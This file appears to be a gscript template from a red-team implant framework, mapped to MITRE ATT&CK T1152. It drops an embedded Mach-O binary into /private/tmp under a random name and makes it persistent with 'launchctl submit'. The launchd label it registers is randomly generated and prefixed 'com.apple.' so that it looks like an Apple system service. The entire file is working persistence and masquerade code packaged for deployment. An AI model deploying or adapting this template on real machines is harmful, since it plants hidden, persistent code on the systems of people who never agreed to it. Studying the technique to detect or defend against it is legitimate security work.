// Example gscript template
// Title: Launchctl Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using Launchctl
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1152

//priority:90
//timeout:150
//import:/private/tmp/example.macho

var labelname;
var binary_args = "";

function BeforeDeploy() {
  LogInfo("starting execution of Launchctl Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/private/tmp/"+name;
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);
  
  // Persist the sample
  var label = "";
  for (var i = 0; i < 5; i++)
    label += possible.charAt(Math.floor(Math.random() * possible.length));
  label = "com.apple."+label;
  ExecuteCommand("launchctl", ["submit", "-l", label, "--", name]);
  console.log("Persisted binary using launchctl, with the label: "+label);

  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with Launchctl persistence");
  return true;
}